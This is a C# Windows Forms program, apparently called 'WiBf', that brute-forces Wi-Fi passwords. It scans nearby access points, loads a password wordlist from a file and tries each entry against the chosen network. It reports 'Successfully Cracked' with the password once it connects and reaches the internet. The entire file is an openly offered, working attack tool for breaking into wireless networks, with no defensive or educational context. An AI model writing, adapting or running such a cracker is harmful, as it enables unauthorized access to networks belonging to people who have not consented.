using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using SimpleWifi;
using SimpleWifi.Win32;
using NativeWifi;
using System.Collections.ObjectModel;
using System.Reflection;
using System.Net;

namespace WiBf
{
	public partial class Form1 : Form
	{
		private static Wifi wifi;
		NativeWifi.WlanClient wlan = new NativeWifi.WlanClient();
		List<string> passwords = new List<string>();

		public Form1()
		{
			InitializeComponent();
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			wifi = new Wifi();
			wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
			linkLabel1.Links.Add(12, 7, "https://github.com/Tlgyt");
			List();
			label3.Text = "Status: idle";
		}

		private delegate void SetControlPropertyThreadSafeDelegate(
		Control control,
		string propertyName,
		object propertyValue);

		public static void SetControlPropertyThreadSafe(
				Control control,
				string propertyName,
				object propertyValue)
		{
			if (control.InvokeRequired)
			{
				control.Invoke(new SetControlPropertyThreadSafeDelegate
				(SetControlPropertyThreadSafe),
				new object[] { control, propertyName, propertyValue });
			}
			else
			{
				control.GetType().InvokeMember(
						propertyName,
						BindingFlags.SetProperty,
						null,
						control,
						new object[] { propertyValue });
			}
		}

		private bool check(AccessPoint selectedAP)
		{
			Collection<String> connectedSsids = new Collection<string>();
			if (WifiStatus.Connected.ToString() == "Connected")
			{
				foreach (NativeWifi.WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
				{
					try
					{
						Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
						connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
					}
					catch(Exception)
					{
						return false;
					}
				}
				foreach (string ssid in connectedSsids)
				{
					if (selectedAP.Name == ssid)
					{
						return true;
					}
					else
					{
						return false;
					}
				}
			}
			return false;
		}

		public static bool CheckForInternetConnection()
		{
			try
			{
				using (var client = new WebClient())
				using (var stream = client.OpenRead("http://www.google.com"))
				{
					return true;
				}
			}
			catch
			{
				return false;
			}
		}

		private IEnumerable<AccessPoint> List()
		{
			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
			foreach (AccessPoint ap in accessPoints)
			{
				listBox1.Items.Add(ap.Name);
			}
			return accessPoints;
		}

		private IEnumerable<AccessPoint> Scan()
		{
			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
			return accessPoints;
		}

		private static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
		{
			Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
		}

		private void OnConnectedComplete(bool success)
		{
			Console.WriteLine("\nOnConnectedComplete, success: {0}", success);
		}

		private void crack(AccessPoint selectedAP)
		{
			if (passwords.Count == 0)
			{
				MessageBox.Show("Please Select a Wordlist");
				return;
			}
			foreach (string pass in passwords)
			{
				SetControlPropertyThreadSafe(label3, "Text", "Status: Trying Password: "+pass);
				// Auth
				AuthRequest authRequest = new AuthRequest(selectedAP);
				bool overwrite = true;

				if (authRequest.IsPasswordRequired)
				{
					if (overwrite)
					{
						if (authRequest.IsUsernameRequired)
						{
							Console.Write("\r\nPlease enter a username: ");
							authRequest.Username = Console.ReadLine();
						}
						authRequest.Password = pass;

						if (authRequest.IsDomainSupported)
						{
							Console.Write("\r\nPlease enter a domain: ");
							authRequest.Domain = Console.ReadLine();
						}
					}
				}

				selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
				int i = Convert.ToInt32(textBox1.Text);
				Thread.Sleep(i*1000);
				if (check(selectedAP) == true && CheckForInternetConnection() == true)
				{
					SetControlPropertyThreadSafe(label3, "Text", "Status: Successfully Cracked: "+selectedAP.Name+" With Password: "+pass);
					return;
				}
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				var accessPoints = Scan();
				AccessPoint selectedAP = null;

				foreach (AccessPoint ap in accessPoints)
				{
					if (ap.Name == listBox1.SelectedItem.ToString())
					{
						selectedAP = ap;
					}
				}
				Thread t = new Thread(() => crack(selectedAP));
				t.IsBackground = true;
				t.Start();
			}
			catch (Exception a)
			{
				MessageBox.Show(a.ToString());
			}
		}

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
		}

		private void button2_Click(object sender, EventArgs e)
		{
			OpenFileDialog oFile = new OpenFileDialog();
			openFileDialog1.InitialDirectory = "c:\\";
			openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
			openFileDialog1.FilterIndex = 2;
			openFileDialog1.RestoreDirectory = true;
			string path;
			if (oFile.ShowDialog() == DialogResult.OK)
			{
				path = oFile.FileName;
				int counter = 0;
				string line;
				System.IO.StreamReader file = new System.IO.StreamReader(path);
				while ((line = file.ReadLine()) != null)
				{
					passwords.Add(line);
					counter++;
				}
				file.Close();
			}
		}
	}
}
